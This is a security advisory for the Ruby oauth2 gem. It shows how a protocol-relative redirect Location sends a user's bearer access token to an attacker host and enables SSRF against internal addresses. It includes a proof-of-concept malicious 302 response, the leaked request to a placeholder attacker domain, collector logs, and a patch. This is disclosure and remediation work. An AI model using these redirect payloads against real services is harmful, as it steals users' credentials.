# [H] OAuth2::Client#request: Protocol-relative redirect Location overrides authority, leaking bearer Authorization to attacker host

## Summary
Severity: High
Advisory: GHSA-pp92-crg2-gfv9
CVE: CVE-2026-54603
CWE: CWE-200, CWE-601
Ecosystem: RubyGems
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-28
Source: https://github.com/advisories/GHSA-pp92-crg2-gfv9
Type: github-advisory

## Affected
- RubyGems: `oauth2` — affected >=0.4.0 <2.0.22

## Details
## Summary

When an application uses `OAuth2::Client` (typically via an `OAuth2::AccessToken`) and the configured authorization server returns a redirect whose `Location` header is a protocol-relative URI of the form `//attacker.example/leak`, `OAuth2::Client#request` resolves the redirect with `response.response.env.url.merge(location)`. Per RFC 3986 §5.2, an input that starts with `//` is a network-path reference and replaces the authority of the base URL: `URI("http://idp.trusted/userinfo").merge("//attacker.example/leak")` returns `http://attacker.example/leak`. The recursive `request(verb, full_location, req_opts)` call then re-sends the request to the attacker host while preserving the `Authorization: Bearer <access-token>` header that `OAuth2::AccessToken#configure_authentication!` installed on `req_opts[:headers]` for the original request.

The result is a one-shot cross-origin credential disclosure: any 30x response from the IdP that an attacker can influence (a compromised endpoint, a tenant-controlled IdP in a multi-tenant deployment, or an open-redirect handler that does not normalise the `Location` it emits) can extract the bearer access token of the calling user.

## Affected

- `oauth2` v2.0.21 and all prior versions back to and including v0.4.0.
  - The underlying unsafe redirect-following behavior that reuses headers starts in v0.4.0 via https://github.com/ruby-oauth/oauth2/commit/b944da54cd70487c06d7252b9e4e7948eae56e73
  - The vulnerability was retained when the code was refactored to a redirect helper, and in this form has been present in `OAuth2::Client#request` since v2.0.0 via https://github.com/ruby-oauth/oauth2/commit/b944da54cd70487c06d7252b9e4e7948eae56e73
- Ruby 4.0.5 on `arm64-darwin25`. The behaviour of `URI#merge` for protocol-relative inputs is RFC-conformant and the same on every supported Ruby (≥ 2.x).
- Adapter independence: confirmed against the default `faraday` 2.14.2 + `faraday-net_http` 3.4.3 stack. The `URI#merge` call is in `oauth2` itself, not in Faraday, so the issue is not adapter-specific.

## Impact

A consumer that uses `OAuth2::AccessToken#get` / `#post` / `#request` against an IdP whose redirect target an attacker can influence (open redirect, malicious tenant, or in-path adversary) loses two things at once:

1. **Cross-origin credential disclosure.** The connection-scoped `Authorization: Bearer <token>` header attached by `OAuth2::AccessToken#configure_authentication!` is sent to the attacker host on the very next request, with no second user interaction.
2. **SSRF from the application server.** The OAuth2 client follows the redirect on behalf of the application, so the host that ultimately receives the request is one the attacker chooses — useful for hitting internal addresses (`//169.254.169.254/...`, `//127.0.0.1:.../...`) that the application server can reach but the attacker cannot.

The combined primitive is stronger than the usual cross-origin-redirect leak because no application-level cooperation is required and no `Location: http://attacker/...` is needed — the protocol-relative `//attacker/x` form slips past naive scheme-based Location filters that allow same-scheme-implicit redirects.

## Vulnerable code

[`lib/oauth2/client.rb#L146-L182`](https://github.com/ruby-oauth/oauth2/blob/e2d509705db6091c8d5f27c31e29c58e39e51c7c/lib/oauth2/client.rb#L146-L182) at commit `e2d509705db6091c8d5f27c31e29c58e39e51c7c` (tag `v2.0.20`):

```ruby
def request(verb, url, req_opts = {}, &block)
  response = execute_request(verb, url, req_opts, &block)
  status = response.status

  case status
  when 301, 302, 303, 307
    req_opts[:redirect_count] ||= 0
    req_opts[:redirect_count] += 1
    return response if req_opts[:redirect_count] > options[:max_redirects]

    if status == 303
      verb = :get
      req_opts.delete(:body)
    end
    location = response.headers["location"]
    if location
      full_location = response.response.env.url.merge(location)  # <-- protocol-relative input replaces authority
      request(verb, full_location, req_opts)
    # ...
```

`response.response.env.url` is the resolved URL of the prior request (always absolute, since Faraday's `build_exclusive_url` produces an absolute URI). `location` is the raw `Location` response header, with no validation. `URI#merge` follows RFC 3986 §5.2 and treats `//host/path` as a network-path reference, dropping the base authority and adopting the input's host. The recursive `request(verb, full_location, req_opts)` then re-enters with `req_opts` unchanged, which means any `Authorization` header that `OAuth2::AccessToken#configure_authentication!` placed in `req_opts[:headers]` for the original request travels with the redirected request to the attacker-controlled host.

The credential plumbing is at [`lib/oauth2/access_token.rb#L376-L408`](https://github.com/ruby-oauth/oauth2/blob/e2d509705db6091c8d5f27c31e29c58e39e51c7c/lib/oauth2/access_token.rb#L376-L408):

```ruby
def configure_authentication!(opts, verb)
  # ...
  case mode
  when :header
    opts[:headers] ||= {}
    opts[:headers].merge!(headers)
  # ...
end

def headers
  {"Authorization" => options[:header_format] % token}
end
```

The default token mode is `:header`, so every `AccessToken#get` / `#post` / `#request` call attaches `Authorization: Bearer <token>` to `req_opts[:headers]`. That same dictionary is then forwarded verbatim into the redirected request, because `Client#request` does not inspect or strip `req_opts[:headers]` when the redirect crosses origins.

## Reachable in production

The vulnerable path is the documented `AccessToken#get` / `AccessToken#post` flow that every `oauth2` integration uses to call a resource server after the token exchange. The redirect handler is enabled unconditionally for status codes 301, 302, 303, and 307, up to `options[:max_redirects]` hops (default 5). No opt-in flag is required: a single 302 response with a protocol-relative `Location` header is enough to redirect the next request to an attacker host with the bearer token attached.

Realistic upstream triggers:

1. **Open redirect on the IdP.** Many authorization servers expose endpoints that emit `Location` based on user input (for example logout flows, `redirect_uri` echoes, branded splash pages). When that endpoint does not normalise the user-supplied target, an attacker can plant `//attacker.example/leak` as the redirect target and induce the oauth2 client to follow it.
2. **Tenant-controlled IdP.** Multi-tenant SaaS where each tenant configures its own OIDC issuer URL via `OAuth2::Client.new(... , site: tenant_supplied_url)` allows a malicious tenant to set `site:` to its own server and emit the protocol-relative `Location` directly.
3. **Compromised or downgraded IdP.** A network-position adversary capable of altering a single response header before TLS termination (for example via a proxy that legitimately rewrites Location headers) can craft the protocol-relative form.

In all three cases the access token is sent to the attacker host on the very next request: there is no second-hop redirect chain, no second user interaction, and no opportunity for the application to inspect the redirect target.

## Reproduction

The issue can be reproduced with a client using the default bearer-token header mode against an `oauth2` version before `2.0.22`.

Minimal setup:

```ruby
require "oauth2"

client = OAuth2::Client.new(
  "client-id",
  "client-secret",
  site: "http://idp.example.test"
)

token = OAuth2::AccessToken.new(client, "SECRET-BEARER-TOKEN")
token.get("/userinfo")
```

If the configured authorization/resource server responds to that request with a redirect such as:

```http
HTTP/1.1 302 Found
Location: //attacker.example.test/leak
Content-Length: 0
```

then vulnerable versions resolve the protocol-relative `Location` as a cross-origin URL and recursively issue the follow-up request while preserving the original request headers. Because `OAuth2::AccessToken` uses `Authorization: Bearer <token>` by default, the next request is sent to the attacker-controlled host with the bearer token attached:

```http
GET /leak HTTP/1.1
Host: attacker.example.test
Authorization: Bearer SECRET-BEARER-TOKEN
```

This requires no special Faraday adapter behavior. The vulnerable redirect handling is in `OAuth2::Client#request`; the attacker-controlled input is the raw `Location` header value from a 30x response.

### Patched-build verification

Monkey-patch `OAuth2::Client#request` so that protocol-relative `Location` values are forced down the relative-path branch of `URI#merge` by prepending `./`. Re-run the attack against the same `poc_collector.rb` instance.

```ruby
module OAuth2
  class Client
    def request(verb, url, req_opts = {}, &block)
      response = execute_request(verb, url, req_opts, &block)
      status = response.status
      case status
      when 301, 302, 303, 307
        req_opts[:redirect_count] ||= 0
        req_opts[:redirect_count] += 1
        return response if req_opts[:redirect_count] > options[:max_redirects]
        verb = :get and req_opts.delete(:body) if status == 303
        location = response.headers["location"]
        if location
          # PATCH: neutralise protocol-relative location before URI#merge.
          safe_location = location.start_with?("//") ? "./#{location}" : location
          full_location = response.response.env.url.merge(safe_location)
          request(verb, full_location, req_opts)
        else
          raise(Error.new(response), "Got #{status} status code, but no Location header was present")
        end
      # ... unchanged fallthrough ...
      end
    end
  end
end
```

After applying the patch, the same `token.get("/userinfo")` call resolves the attack `Location: //127.0.0.1:4568/leak` to `http://127.0.0.1:4567/127.0.0.1:4568/leak` — same host as the IdP — and `:4568` never receives the bearer token. The IdP redirect loop trips `max_redirects` and the helper returns `status: 302` to the caller with no off-host request. Collector log after the patched run shows `:4568` LEAK count unchanged from the negative control:

```text
[idp:4567] hit  req_line=GET /userinfo HTTP/1.1  auth="Bearer SECRET-BEARER-XYZZY"
[idp:4567] hit  req_line=GET ///127.0.0.1:4568/leak HTTP/1.1  auth="Bearer SECRET-BEARER-XYZZY"
[idp:4567] hit  req_line=GET ///127.0.0.1:4568///127.0.0.1:4568/leak HTTP/1.1  auth="Bearer SECRET-BEARER-XYZZY"
```

All hops stay on `127.0.0.1:4567`. The bearer token never leaves the IdP.

## Suggested fix

Treat protocol-relative `Location` values as relative paths when resolving against the prior request URL. The smallest local fix is the `./` prefix used in `Faraday::Connection#build_exclusive_url` for the same primitive (see lines 485-488 of `faraday/lib/faraday/connection.rb`):

```ruby
location = response.headers["location"]
if location
  # Force protocol-relative inputs to be interpreted as relative paths so they
  # cannot override the base authority via RFC 3986 §5.2 network-path reference.
  safe_location = location.respond_to?(:start_with?) && location.start_with?("//") \
    ? "./#{location}" : location
  full_location = response.response.env.url.merge(safe_location)
  request(verb, full_location, req_opts)
```

A defence-in-depth follow-up is to also strip credential-bearing headers (`Authorization`, plus any custom headers configured via `header_format`) from `req_opts[:headers]` when the resolved host changes across the redirect, which mirrors how Mechanize handles cross-host redirects in `lib/mechanize/http/agent.rb#L1068-L1077`. That additional check protects against the orthogonal case where an attacker controls an absolute `Location: http://attacker.example/...` value on a same-host open-redirect endpoint.

## Credit

Reported by tonghuaroot.

## References
- https://github.com/ruby-oauth/oauth2/security/advisories/GHSA-pp92-crg2-gfv9
- https://github.com/ruby-oauth/oauth2/commit/0f0a474f1b38453e119e660c2daca742d4378ce9
- https://github.com/ruby-oauth/oauth2
- https://github.com/ruby-oauth/oauth2/releases/tag/v2.0.22
